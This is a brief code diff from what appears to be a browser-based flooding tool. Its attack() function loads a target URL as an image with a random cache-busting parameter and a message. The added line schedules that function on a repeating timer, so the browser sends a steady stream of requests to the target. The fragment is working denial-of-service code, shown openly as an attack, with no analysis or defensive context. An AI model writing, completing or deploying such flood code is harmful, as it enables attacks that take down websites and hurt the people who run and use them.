@@ -17,3 +17,4 @@ function attack() {
                       img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);
   
   }
+setInterval(attack, speed);
